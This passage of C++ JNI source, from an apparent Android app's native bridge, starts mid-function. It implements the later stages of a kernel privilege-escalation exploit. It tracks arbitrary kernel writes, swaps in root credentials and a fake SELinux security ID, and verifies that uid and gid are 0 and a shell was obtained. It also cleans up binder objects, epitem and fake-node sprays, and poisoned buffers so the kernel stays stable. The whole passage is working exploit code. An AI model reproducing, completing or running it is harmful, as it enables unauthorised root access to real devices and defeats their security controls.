        wake_command_watchdog(&g_ctlbuf_donor_frozen_confirmation, INT_MAX);
    }
    char state[320];
    std::snprintf(state, sizeof(state),
            "status=%s stage=ctlbuf-donor-frozen nonce=%s pid=%d"
            " confirmation=%d signal_state=%d frozen=%d leader_stage=%d",
            pass ? "pass" : "fail", g_command_watchdog_nonce, donor_pid,
            confirmation, frozen_signal_state, frozen, leader_stage);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT void JNICALL
Java_com_vandam_prism_NativeBridge_signalCredentialNormalisation(
        JNIEnv*, jclass) {
    g_command_watchdog_normalise.store(1, std::memory_order_release);
    wake_command_watchdog(&g_command_watchdog_normalise, 1);
    g_helper_normalise_gate.store(1, std::memory_order_release);
    syscall(SYS_futex, &g_helper_normalise_gate, FUTEX_WAKE_PRIVATE, 1,
            nullptr, nullptr, 0);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_ctlbufRescueStatus(
        JNIEnv* environment, jclass) {
    for (int attempt = 0; attempt < 4; ++attempt) {
        int stage_before = g_ctlbuf_rescue_stage.load(
                std::memory_order_acquire);
        int result = g_ctlbuf_rescue_result.load(std::memory_order_relaxed);
        int error = g_ctlbuf_rescue_errno.load(std::memory_order_relaxed);
        int detail = g_ctlbuf_rescue_detail.load(std::memory_order_relaxed);
        int stage_after = g_ctlbuf_rescue_stage.load(
                std::memory_order_acquire);
        if (stage_before == stage_after) {
            if (stage_after == 9) {
                std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
                if (!g_ctlbuf_finalise_proof.empty()) {
                    std::string state =
                            "status=progress stage=ctlbuf-rescue"
                            " stage_code=9 result=" +
                            std::to_string(result) + " errno=" +
                            std::to_string(error) + " detail=" +
                            std::to_string(detail) + " finalise=[" +
                            g_ctlbuf_finalise_proof + "]";
                    return environment->NewStringUTF(state.c_str());
                }
            }
            std::string state =
                    "status=progress stage=ctlbuf-rescue stage_code=" +
                    std::to_string(stage_after) + " result=" +
                    std::to_string(result) + " errno=" +
                    std::to_string(error) + " detail=" +
                    std::to_string(detail);
            return environment->NewStringUTF(state.c_str());
        }
    }
    return environment->NewStringUTF(
            "status=progress stage=ctlbuf-rescue"
            " stage_code=-1 result=-1 errno=11 detail=0");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_ctlbufFinaliseStatus(
        JNIEnv* environment, jclass) {
    std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
    if (g_ctlbuf_finalise_proof.empty()) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-finalise reason=unavailable");
    }
    return environment->NewStringUTF(g_ctlbuf_finalise_proof.c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_acceptCtlbufFinaliseProof(
        JNIEnv* environment, jclass, jstring proof_string) {
    if (proof_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-finalise-proof reason=input");
    }
    const char* chars = environment->GetStringUTFChars(
            proof_string, nullptr);
    if (chars == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-finalise-proof reason=string");
    }
    std::string proof(chars);
    environment->ReleaseStringUTFChars(proof_string, chars);
    bool valid = validate_ctlbuf_finalise_status(
            proof, g_credential_target_pid);
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
        if (valid && !g_ctlbuf_finalise_verified) {
            g_ctlbuf_finalise_proof = proof;
            g_ctlbuf_finalise_verified = true;
            g_ctlbuf_finalise_status_code = 0;
        } else if (!valid) {
            g_ctlbuf_finalise_status_code = EPROTO;
        }
    }
    return environment->NewStringUTF(
            valid ? "status=pass stage=ctlbuf-finalise-proof"
                  : "status=fail stage=ctlbuf-finalise-proof reason=invalid");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_acceptTerminalNormalisationHostGate(
        JNIEnv* environment, jclass, jstring gate_string) {
    if (gate_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=terminal-normalisation-host-gate"
                " reason=input");
    }
    const char* chars = environment->GetStringUTFChars(
            gate_string, nullptr);
    if (chars == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=terminal-normalisation-host-gate"
                " reason=string");
    }
    std::string gate(chars);
    environment->ReleaseStringUTFChars(gate_string, chars);
    const std::vector<const char*> names = {
            "nonce", "helper_pid", "helper_start_time", "boot_id",
            "watchdog_tid", "joined", "tid_gone", "uid_result",
            "gid_result", "shell", "ctlbuf_repaired", "module_loaded",
            "module_unloaded", "module_finalised", "finalise_proof",
            "donor_frozen", "donor_resumed", "donor_resume_pid",
            "donor_resume_result", "donor_resume_errno",
            "resume_magic", "resume_version", "resume_size",
            "resume_cookie_hi", "resume_cookie_lo", "resume_helper_task",
            "resume_helper_pid", "resume_donor_task", "resume_donor_tgid",
            "resume_signal", "resume_before_state",
            "resume_before_exit_state", "resume_before_threads",
            "resume_before_stopped", "resume_after_state",
            "resume_after_exit_state", "resume_after_threads",
            "resume_after_stopped", "resume_stable_samples",
            "resume_task_security", "resume_task_security_word8",
            "resume_inode_security", "resume_inode_security_word8",
            "resume_labels_restored", "resume_resumed", "resume_proof",
            "resume_commit", "host_donor_pid", "host_donor_start_time",
            "host_donor_tids", "host_donor_states", "host_donor_samples",
            "host_helper_identity",
    };
    std::map<std::string, std::string> fields;
    bool parsed = parse_ordered_record(gate, names, &fields);
    int helper_pid = -1;
    int watchdog_tid = -1;
    int host_donor_pid = -1;
    int host_donor_samples = 0;
    auto parse_u64 = [&](const char* name, std::uint64_t* target) {
        return parse_unsigned_long_field(fields[name], target);
    };
    auto parse_u32 = [&](const char* name, std::uint32_t* target) {
        std::uint64_t value = 0;
        bool valid = parse_unsigned_long_field(fields[name], &value) &&
                value <= UINT32_MAX;
        if (valid) {
            *target = static_cast<std::uint32_t>(value);
        }
        return valid;
    };
    auto parse_s32 = [&](const char* name, std::int32_t* target) {
        int value = 0;
        bool valid = parse_int_field(fields[name], &value);
        if (valid) {
            *target = value;
        }
        return valid;
    };
    CtlbufDonorResumeRecord resume {};
    bool resume_fields = parsed &&
            parse_u64("resume_magic", &resume.magic) &&
            parse_u32("resume_version", &resume.version) &&
            parse_u32("resume_size", &resume.size) &&
            parse_u64("resume_cookie_hi", &resume.cookie_hi) &&
            parse_u64("resume_cookie_lo", &resume.cookie_lo) &&
            parse_u64("resume_helper_task", &resume.helper_task) &&
            parse_s32("resume_helper_pid", &resume.helper_pid) &&
            parse_u64("resume_donor_task", &resume.donor_task) &&
            parse_s32("donor_resume_pid", &resume.donor_pid) &&
            parse_s32("resume_donor_tgid", &resume.donor_tgid) &&
            parse_s32("resume_signal", &resume.signal) &&
            parse_s32("donor_resume_result", &resume.signal_rc) &&
            parse_s32("donor_resume_errno", &resume.signal_errno) &&
            parse_u64("resume_before_state", &resume.pre_state) &&
            parse_u64("resume_before_exit_state", &resume.pre_exit_state) &&
            parse_u32("resume_before_threads", &resume.pre_thread_count) &&
            parse_u32("resume_before_stopped", &resume.pre_stopped_count) &&
            parse_u64("resume_after_state", &resume.post_state) &&
            parse_u64("resume_after_exit_state", &resume.post_exit_state) &&
            parse_u32("resume_after_threads", &resume.post_thread_count) &&
            parse_u32("resume_after_stopped", &resume.post_stopped_count) &&
            parse_u32("resume_stable_samples", &resume.stable_samples) &&
            parse_u64("resume_task_security", &resume.task_security) &&
            parse_u64("resume_task_security_word8",
                      &resume.task_security_word8) &&
            parse_u64("resume_inode_security", &resume.inode_security) &&
            parse_u64("resume_inode_security_word8",
                      &resume.inode_security_word8) &&
            parse_u32("resume_labels_restored", &resume.labels_restored) &&
            parse_u32("resume_resumed", &resume.resumed) &&
            parse_u32("resume_proof", &resume.proof) &&
            parse_u64("resume_commit", &resume.commit);
    CtlbufDonorResumeProof resume_proof;
    bool resume_valid = resume_fields &&
            validate_ctlbuf_donor_resume_status(
                    resume, resume.helper_pid, &resume_proof);
    bool values = parsed && fields["nonce"].size() == 32 &&
            lower_hex_digits(fields["nonce"]) &&
            fields["nonce"] == g_command_watchdog_nonce &&
            decimal_digits(fields["helper_pid"]) &&
            parse_int_field(fields["helper_pid"], &helper_pid) &&
            helper_pid == g_credential_target_pid &&
            decimal_digits(fields["helper_start_time"]) &&
            canonical_boot_id(fields["boot_id"]) &&
            fields["boot_id"] == read_bounded_text(
                    "/proc/sys/kernel/random/boot_id", 64) &&
            parse_int_field(fields["watchdog_tid"], &watchdog_tid) &&
            watchdog_tid > 0 && watchdog_tid != helper_pid &&
            fields["joined"] == "1" && fields["tid_gone"] == "1" &&
            fields["uid_result"] == "0" && fields["gid_result"] == "0" &&
            fields["shell"] == "1" && fields["ctlbuf_repaired"] == "1" &&
            fields["module_loaded"] == "1" &&
            fields["module_unloaded"] == "1" &&
            fields["module_finalised"] == "1" &&
            fields["finalise_proof"] == "1" &&
            fields["donor_frozen"] == "1" &&
            fields["donor_resumed"] == "1" &&
            resume_valid && resume.helper_pid == helper_pid &&
            parse_int_field(fields["host_donor_pid"], &host_donor_pid) &&
            host_donor_pid == resume.donor_pid &&
            decimal_digits(fields["host_donor_start_time"]) &&
            !fields["host_donor_tids"].empty() &&
            !fields["host_donor_states"].empty() &&
            parse_int_field(fields["host_donor_samples"],
                            &host_donor_samples) &&
            host_donor_samples == 2 &&
            fields["host_helper_identity"] == "1";
    if (values) {
        g_terminal_host_normalisation_gate = true;
    }
    return environment->NewStringUTF(
            values
                    ? "status=pass stage=terminal-normalisation-host-gate"
                    : "status=fail stage=terminal-normalisation-host-gate"
                      " reason=invalid");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_recordCredentialTargetDeath(
        JNIEnv* environment, jclass, jint pid, jstring start_string,
        jstring boot_string) {
    if (start_string == nullptr || boot_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=credential-target-death reason=input");
    }
    const char* start_chars = environment->GetStringUTFChars(
            start_string, nullptr);
    const char* boot_chars = environment->GetStringUTFChars(
            boot_string, nullptr);
    if (start_chars == nullptr || boot_chars == nullptr) {
        if (start_chars != nullptr) {
            environment->ReleaseStringUTFChars(start_string, start_chars);
        }
        if (boot_chars != nullptr) {
            environment->ReleaseStringUTFChars(boot_string, boot_chars);
        }
        return environment->NewStringUTF(
                "status=fail stage=credential-target-death reason=string");
    }
    std::string start(start_chars);
    std::string boot(boot_chars);
    environment->ReleaseStringUTFChars(start_string, start_chars);
    environment->ReleaseStringUTFChars(boot_string, boot_chars);
    std::string current_boot = read_bounded_text(
            "/proc/sys/kernel/random/boot_id", 64);
    bool metadata = pid > 0 && pid == g_credential_target_pid &&
            g_credential_target_handle > 0 && decimal_digits(start) &&
            canonical_boot_id(boot) && current_boot == boot;
    std::lock_guard<std::mutex> lock(g_credential_target_death_mutex);
    bool pass = metadata && !g_credential_target_death_recorded;
    if (pass) {
        g_credential_target_death_recorded = true;
        char state[320];
        std::snprintf(state, sizeof(state),
                "status=pass stage=credential-target-death"
                " pid=%d start_time=%s boot_id=%s binder_handle=%d"
                " callback=1 one_shot=1",
                pid, start.c_str(), boot.c_str(),
                g_credential_target_handle);
        g_credential_target_death_proof = state;
    }
    if (!pass) {
        return environment->NewStringUTF(
                "status=fail stage=credential-target-death reason=state");
    }
    return environment->NewStringUTF(g_credential_target_death_proof.c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_credentialTargetDeathProof(
        JNIEnv* environment, jclass) {
    std::lock_guard<std::mutex> lock(g_credential_target_death_mutex);
    if (!g_credential_target_death_recorded) {
        return environment->NewStringUTF(
                "status=fail stage=credential-target-death reason=not-seen");
    }
    return environment->NewStringUTF(g_credential_target_death_proof.c_str());
}

extern "C" JNIEXPORT void JNICALL
Java_com_vandam_prism_NativeBridge_exitCredentialHelper(
        JNIEnv*, jclass) {
    syscall(SYS_exit_group, 0);
    __builtin_unreachable();
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_validateTerminalNormalisation(
        JNIEnv* environment, jclass) {
    std::string proof;
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
        proof = g_ctlbuf_finalise_proof;
    }
    bool finalise_proof = g_ctlbuf_finalise_verified &&
            !proof.empty() && validate_ctlbuf_finalise_status(
                    proof, g_credential_target_pid);
    bool sequence = g_direct_terminal_cleanup &&
            g_direct_write_step == 7 && g_write_successes == 6 &&
            !g_null_write_armed;
    bool private_credential = kernel_pointer(g_private_cred) &&
            g_private_cred_sid != 0 &&
            static_cast<std::uint32_t>(g_private_cred_snapshot[0]) == 2;
    bool module_lifecycle = g_terminal_host_normalisation_gate;
    bool pass = sequence && finalise_proof && private_credential &&
            module_lifecycle;
    g_final_shell_cred = pass ? g_private_cred : 0;
    g_final_shell_cred_valid = pass;
    g_terminal_ctlbuf_repair_verified = pass;
    char state[896];
    std::snprintf(state, sizeof(state),
            "status=%s stage=terminal-normalisation"
            " sequence_complete=%d private_credential=%d"
            " module_finalised=%d finalise_proof=%d"
            " module_loaded=%d module_unloaded=%d"
            " ctlbuf_repaired=%d proof_fields=exact post_finalise_reads=0",
            pass ? "pass" : "fail", sequence ? 1 : 0,
            private_credential ? 1 : 0, finalise_proof ? 1 : 0,
            finalise_proof ? 1 : 0,
            module_lifecycle ? 1 : 0,
            module_lifecycle ? 1 : 0,
            g_terminal_ctlbuf_repair_verified ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_proveTerminalDonorRetirement(
        JNIEnv* environment, jclass) {
    std::string finalise_status;
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
        finalise_status = g_ctlbuf_finalise_proof;
    }
    bool finalise_proof = g_ctlbuf_finalise_verified &&
            !finalise_status.empty() &&
            validate_ctlbuf_finalise_status(
                    finalise_status, g_credential_target_pid);
    bool sequence_complete = g_direct_terminal_cleanup &&
            g_direct_write_step == 7 && g_write_successes == 6 &&
            !g_null_write_armed && finalise_proof &&
            g_terminal_host_normalisation_gate;
    errno = 0;
    int helper_probe = g_credential_target_pid > 0
            ? kill(g_credential_target_pid, 0) : -1;
    int helper_probe_errno = helper_probe == 0 ? 0 : errno;
    bool helper_retired = g_credential_target_pid > 0 &&
            helper_probe == -1 && helper_probe_errno == ESRCH;
    bool death_recorded = false;
    {
        std::lock_guard<std::mutex> lock(g_credential_target_death_mutex);
        death_recorded = g_credential_target_death_recorded &&
                g_credential_target_death_proof.rfind(
                        "status=pass stage=credential-target-death ", 0) == 0;
    }
    bool preexit_refs_valid = g_terminal_donor_preexit_refs_valid;
    std::uint32_t preexit_usage = g_terminal_donor_preexit_usage;
    bool donor_refs_retired = preexit_refs_valid &&
            preexit_usage == g_terminal_donor_usage + 2U;
    bool strict = sequence_complete && helper_retired && death_recorded &&
            donor_refs_retired;
    std::uint64_t sequence = 0;
    {
        std::lock_guard<std::mutex> lock(g_terminal_donor_proof_mutex);
        sequence = g_terminal_sequence;
    }
    TerminalDonorRetirementProof candidate;
    candidate.sequence = sequence;
    candidate.helper_retired = helper_retired;
    candidate.helper_unlinked = false;
    candidate.credential_target_death = death_recorded;
    candidate.helper_unlink_samples = 0;
    candidate.helper_proc = 0;
    candidate.donor_live_before = finalise_proof;
    candidate.donor_live_before_stage = finalise_proof ? 7 : 0;
    candidate.donor_live_a_stage = candidate.donor_live_before_stage;
    candidate.donor_live_b_stage = candidate.donor_live_before_stage;
    candidate.donor_slots = finalise_proof;
    candidate.donor_proc = g_security_target_proc;
    candidate.donor_task = g_terminal_donor_task;
    candidate.donor_cred = g_security_target_cred;
    candidate.donor_blob = g_terminal_donor_security;
    candidate.donor_sid = g_terminal_donor_sid;
    candidate.donor_caps = g_terminal_donor_caps;
    candidate.donor_real_cred_slot = g_terminal_donor_real_cred_slot;
    candidate.donor_cred_slot = g_terminal_donor_cred_slot;
    candidate.donor_real_cred = g_security_target_cred;
    candidate.donor_cred_value = g_security_target_cred;
    candidate.donor_baseline = finalise_proof;
    candidate.baseline_usage = g_terminal_donor_usage;
    candidate.observed_usage = g_terminal_donor_usage;
    candidate.donor_live_pre_snapshot_2 = finalise_proof;
    candidate.donor_live_pre_snapshot_2_stage = finalise_proof ? 7 : 0;
    candidate.donor_snapshot_stage = finalise_proof ? 15 : 0;
    candidate.donor_repair = finalise_proof ? 0 : UINT64_MAX;
    candidate.complete_samples = finalise_proof ? 2 : 0;
    candidate.preexit_refs_valid = preexit_refs_valid;
    candidate.preexit_usage = preexit_usage;
    candidate.donor_refs_retired = donor_refs_retired;
    bool stored = false;
    if (strict) {
        std::lock_guard<std::mutex> lock(g_terminal_donor_proof_mutex);
        if (sequence == g_terminal_sequence &&
                !g_terminal_donor_proof.valid &&
                !g_terminal_donor_proof.consumed) {
            candidate.valid = true;
            g_terminal_donor_proof = candidate;
            stored = true;
        }
    }
    bool pass = strict && stored;
    char state[1024];
    std::snprintf(state, sizeof(state),
            "status=%s stage=terminal-donor-retirement"
            " sequence=%" PRIu64 " reason=%s"
            " helper_retired=%d helper_unlinked=0"
            " credential_target_death=%d helper_unlink_samples=0"
            " helper_proc=0x0"
            " module_finalised=%d finalise_proof=%d"
            " donor_baseline=%d donor_slots=%d donor_repair=0x%" PRIx64
            " donor_task=0x%" PRIx64 " donor_cred=0x%" PRIx64
            " final_usage=%u preexit_refs_valid=%d preexit_usage=%u"
            " preexit_delta=%d donor_refs_retired=%d"
            " proof_stored=%d post_finalise_reads=0",
            pass ? "pass" : "fail", sequence,
            pass ? "none" : !finalise_proof ? "finalise-proof" :
                    !helper_retired ? "helper-live" :
                    !death_recorded ? "binder-death" :
                    !donor_refs_retired ? "donor-preexit" : "proof-reused",
            helper_retired ? 1 : 0, death_recorded ? 1 : 0,
            finalise_proof ? 1 : 0, finalise_proof ? 1 : 0,
            candidate.donor_baseline ? 1 : 0, candidate.donor_slots ? 1 : 0,
            candidate.donor_repair, candidate.donor_task,
            candidate.donor_cred, candidate.baseline_usage,
            candidate.preexit_refs_valid ? 1 : 0, candidate.preexit_usage,
            (candidate.preexit_usage >= candidate.baseline_usage &&
             candidate.preexit_usage - candidate.baseline_usage == 2U) ? 2 : -1,
            candidate.donor_refs_retired ? 1 : 0, stored ? 1 : 0);
    return environment->NewStringUTF(state);

}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_completeTerminalCleanupLegacy(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=reboot-required stage=terminal-cleanup"
                " outcome=incomplete reboot_required=1"
                " reason=directory durable=0");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=reboot-required stage=terminal-cleanup"
                " outcome=incomplete reboot_required=1"
                " reason=directory durable=0");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    int required_writes = g_direct_cred_quarantine ? 5 : 4;
    bool sequence_complete = g_direct_init_target &&
            g_direct_security_repair &&
            g_direct_write_step == required_writes + 1 &&
            g_write_successes == required_writes &&
            !g_null_write_armed;

    errno = 0;
    int helper_probe = g_credential_target_pid > 0
            ? kill(g_credential_target_pid, 0) : -1;
    int helper_probe_errno = helper_probe == 0 ? 0 : errno;
    bool helper_retired = g_credential_target_pid > 0 &&
            helper_probe != 0 && helper_probe_errno == ESRCH;
    std::uint64_t helper_proc = 0;
    if (g_credential_target_handle > 0 &&
        kernel_pointer(g_cached_current_binder_proc)) {
        helper_proc = find_target_binder_proc(
                g_cached_current_binder_proc,
                g_credential_target_handle);
    }
    bool helper_unlinked = helper_proc == 0;
    std::uint64_t donor_real_cred = 0;
    std::uint64_t donor_cred = 0;
    std::uint64_t collateral = UINT64_MAX;
    bool donor_live_before = validate_live_security_target();
    int donor_live_before_stage = g_live_security_target_stage;
    bool donor_slots = donor_live_before &&
            reliable_read64(g_security_target_real_cred_slot,
                            &donor_real_cred) &&
            donor_real_cred == g_security_target_cred &&
            reliable_read64(g_security_target_cred_slot, &donor_cred) &&
            donor_cred == g_security_target_cred;
    bool collateral_restored = donor_slots &&
            reliable_read64_allow_zero(
                    g_security_target_cred + 8,
                    g_security_target_cred_slot,
                    g_security_target_cred, &collateral) &&
            collateral == 0;

    std::uint64_t first_repair = UINT64_MAX;
    bool first_snapshot = donor_slots && !g_direct_cred_quarantine &&
            validate_zero_root_cred_snapshot(
                    g_security_target_task, g_security_target_cred,
                    g_security_target_real_cred_slot,
                    g_security_target_cred_slot,
                    g_security_target_blob, g_fake_security_sid,
                    &first_repair);
    std::uint32_t first_usage = first_snapshot
            ? static_cast<std::uint32_t>(g_zero_snapshot_header)
            : UINT32_MAX;
    std::uint64_t second_repair = UINT64_MAX;
    bool second_snapshot = first_snapshot &&
            validate_zero_root_cred_snapshot(
                    g_security_target_task, g_security_target_cred,
                    g_security_target_real_cred_slot,
                    g_security_target_cred_slot,
                    g_security_target_blob, g_fake_security_sid,
                    &second_repair);
    std::uint32_t observed_usage = second_snapshot
            ? static_cast<std::uint32_t>(g_zero_snapshot_header)
            : UINT32_MAX;
    bool donor_baseline = second_snapshot && first_repair == 0 &&
            second_repair == 0 &&
            first_usage == g_security_target_baseline_usage &&
            observed_usage == g_security_target_baseline_usage;
    bool donor_live_after = second_snapshot &&
            validate_live_security_target();
    int donor_live_after_stage = donor_live_after
            ? g_live_security_target_stage : 0;

    int isolated_total = 0;
    int isolated_retired = 0;
    {
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        isolated_total = static_cast<int>(g_raw_isolated_pids.size());
        for (int pid : g_raw_isolated_pids) {
            errno = 0;
            if (kill(pid, 0) != 0 && errno == ESRCH) {
                ++isolated_retired;
            }
        }
    }
    int primitive_fds = 0;
    {
        std::lock_guard<std::mutex> lock(g_epitem_mutex);
        primitive_fds = static_cast<int>(g_epitem_fds.size() +
                g_file_probe_fds.size() +
                g_file_probe_epoll_fds.size());
    }
    int fake_node_fds = 0;
    {
        std::lock_guard<std::mutex> lock(g_fake_node_mutex);
        fake_node_fds = static_cast<int>(g_fake_node_fds.size());
    }
    int retained_buffers = poisoned_control_count();

    const char* reason = !sequence_complete
            ? "mutation-incomplete"
            : g_direct_cred_quarantine
                    ? "credential-quarantined"
                    : "unbalanced-cred-refs";
    char state[2048];
    std::snprintf(state, sizeof(state),
            "status=reboot-required stage=terminal-cleanup"
            " outcome=incomplete reboot_required=1 reason=%s"
            " durable=1 sequence_complete=%d required_writes=%d"
            " successful_writes=%d internal_write_misses=%d"
            " used_victims=%d helper_pid=%d helper_probe=%d"
            " helper_probe_errno=%d helper_retired=%d"
            " helper_unlinked=%d helper_proc=0x%" PRIx64
            " helper_slots_restored=0 helper_refs_retired=0"
            " donor_live_before=%d donor_live_before_stage=%d"
            " donor_slots=%d donor_real_cred=0x%" PRIx64
            " donor_cred=0x%" PRIx64
            " donor_baseline=%d baseline_usage=%u observed_usage=%u"
            " donor_live_after=%d donor_live_after_stage=%d"
            " donor_refs_retired=0 collateral_restored=%d"
            " collateral=0x%" PRIx64
            " retained_read_buffers=%d poisoned_sprays=%d"
            " spray_active=%d spray_expected=%d sprays_retired=0"
            " binder_controlled_unlinks=0"
            " binder_objects_retired=0 isolated_total=%d"
            " isolated_retired=%d primitive_fds=%d fake_node_fds=%d"
            " native_fds_retired=0",
            reason, sequence_complete ? 1 : 0, required_writes,
            g_write_successes, g_internal_write_misses,
            g_write_victims_used, g_credential_target_pid,
            helper_probe, helper_probe_errno,
            helper_retired ? 1 : 0, helper_unlinked ? 1 : 0,
            helper_proc, donor_live_before ? 1 : 0,
            donor_live_before_stage, donor_slots ? 1 : 0,
            donor_real_cred, donor_cred, donor_baseline ? 1 : 0,
            g_security_target_baseline_usage, observed_usage,
            donor_live_after ? 1 : 0, donor_live_after_stage,
            collateral_restored ? 1 : 0, collateral,
            retained_buffers, retained_buffers,
            g_fake_control_active ? 1 : 0, g_fake_control_expected,
            isolated_total, isolated_retired, primitive_fds,
            fake_node_fds);

    g_terminal_cleanup_result = state;
    std::string path = directory + "/terminal-cleanup.result";
    bool durable = write_text_file(path, g_terminal_cleanup_result);
    int directory_fd = durable ? open(
            directory.c_str(), O_RDONLY | O_CLOEXEC | O_DIRECTORY) : -1;
    durable = directory_fd >= 0 && fsync(directory_fd) == 0;
    if (directory_fd >= 0) {
        durable = close(directory_fd) == 0 && durable;
    }
    if (!durable) {
        unlink(path.c_str());
        g_terminal_cleanup_result =
                "status=reboot-required stage=terminal-cleanup"
                " outcome=incomplete reboot_required=1"
                " reason=result-persist durable=0";
    }
    return environment->NewStringUTF(g_terminal_cleanup_result.c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
        JNIEnv* environment, jclass, jstring directory_string) {
    auto record_stage = [](const char* stage) {
        record_terminal_cleanup_stage(stage);
    };
    record_stage("jni-entered");
    if (!g_direct_terminal_cleanup) {
        record_stage("legacy-selected");
        return Java_com_vandam_prism_NativeBridge_completeTerminalCleanupLegacy(
                environment, nullptr, directory_string);
    }
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=reboot-required stage=terminal-cleanup"
                " outcome=incomplete reboot_required=1"
                " reason=directory durable=0");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=reboot-required stage=terminal-cleanup"
                " outcome=incomplete reboot_required=1"
                " reason=directory durable=0");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    record_stage("entered");

    g_terminal_fd_retirement_gate.store(
            true, std::memory_order_release);
    std::unique_lock<std::mutex> producer_quiescence(
            g_terminal_resource_producer_mutex);
    record_stage("producer-locked");
    std::unique_lock<std::mutex> fake_control_retirement(
            g_fake_control_mutex);
    record_stage("fake-control-locked");
    {
        std::scoped_lock lock(
                g_epitem_mutex, g_fake_node_mutex,
                g_raw_reply_signal_mutex);
    }
    record_stage("resource-locks-pass");
    producer_quiescence.unlock();
    IsolatedRetirementSnapshot isolated_proof =
            consume_isolated_retirement_proof();
    record_stage("isolated-proof-pass");

    bool sequence_complete = g_direct_terminal_cleanup &&
            g_direct_write_step == 7 && g_write_successes == 6 &&
            !g_null_write_armed && g_final_shell_cred_valid;
    errno = 0;
    int helper_probe = g_credential_target_pid > 0
            ? kill(g_credential_target_pid, 0) : -1;
    int helper_probe_errno = helper_probe == 0 ? 0 : errno;
    bool helper_retired = g_credential_target_pid > 0 &&
            helper_probe == -1 && helper_probe_errno == ESRCH;
    TerminalCommandWatchdogProof watchdog_proof =
            read_terminal_command_watchdog_proof(
                    directory, g_credential_target_pid);
    RawTargetRetirementProof raw_target_proof =
            read_raw_target_retirement_proof(directory, watchdog_proof);
    OwnerRetirementProof owner_proof =
            read_owner_retirement_proof(directory, watchdog_proof);
    AnchorRetirementProof anchor_proof =
            read_anchor_retirement_proof(directory, watchdog_proof);
    record_stage("process-proofs-pass");
    bool native_watchdog_record = watchdog_proof.phase_normalised &&
            watchdog_proof.watchdog_tid > 0 &&
            watchdog_proof.watchdog_tid != g_credential_target_pid &&
            watchdog_proof.joined == 1 && watchdog_proof.tid_gone == 1 &&
            watchdog_proof.uid_result == 0 &&
            watchdog_proof.gid_result == 0 && watchdog_proof.shell == 1 &&
            watchdog_proof.ctlbuf_repaired == 1 &&
            watchdog_proof.module_loaded == 1 &&
            watchdog_proof.module_unloaded == 1 &&
            watchdog_proof.module_finalised == 1 &&
            watchdog_proof.finalise_proof == 1 &&
            watchdog_proof.donor_frozen == 1 &&
            watchdog_proof.donor_resumed == 1 &&
            g_terminal_ctlbuf_repair_verified;
    bool normalisation_uid = native_watchdog_record &&
            watchdog_proof.uid_result == 0;
    bool normalisation_gid = native_watchdog_record &&
            watchdog_proof.gid_result == 0;
    bool final_shell_identity = normalisation_uid && normalisation_gid &&
            watchdog_proof.shell == 1 &&
            g_final_shell_cred_valid;
    bool watchdogs_retired = native_watchdog_record &&
            watchdog_proof.helper_retired && helper_retired;

    TerminalDonorRetirementProof donor_proof =
            consume_terminal_donor_proof();
    record_stage(donor_proof.valid
            ? "donor-proof-pass" : "donor-proof-failed");
    bool donor_proof_valid = donor_proof.valid;
    bool donor_proof_consumed = donor_proof_valid && donor_proof.consumed;
    std::uint64_t helper_proc = donor_proof_valid
            ? donor_proof.helper_proc : 0;
    bool credential_target_death = donor_proof_valid &&
            donor_proof.credential_target_death;
    bool helper_unlinked = false;
    int helper_unlink_samples = donor_proof_valid
            ? donor_proof.helper_unlink_samples : 0;
    std::uint64_t donor_real_cred = donor_proof_valid
            ? donor_proof.donor_real_cred : 0;
    std::uint64_t donor_cred = donor_proof_valid
            ? donor_proof.donor_cred_value : 0;
    bool donor_live_before = donor_proof_valid &&
            donor_proof.donor_live_before;
    int donor_live_before_stage = donor_proof_valid
            ? donor_proof.donor_live_before_stage : 0;
    bool donor_slots = donor_proof_valid && donor_proof.donor_slots;
    std::uint32_t observed_usage = donor_proof_valid
            ? donor_proof.observed_usage : UINT32_MAX;
    bool donor_baseline = donor_proof_valid &&
            donor_proof.donor_baseline;
    bool donor_live_pre_snapshot_2 = donor_proof_valid &&
            donor_proof.donor_live_pre_snapshot_2;
    int donor_live_pre_snapshot_2_stage = donor_proof_valid
            ? donor_proof.donor_live_pre_snapshot_2_stage : 0;
    bool donor_refs_retired = donor_proof_valid &&
            donor_proof.donor_refs_retired;
    std::uint32_t donor_baseline_usage = donor_proof_valid
            ? donor_proof.baseline_usage : 0;
    std::uint64_t donor_proof_sequence = donor_proof_valid
            ? donor_proof.sequence : 0;
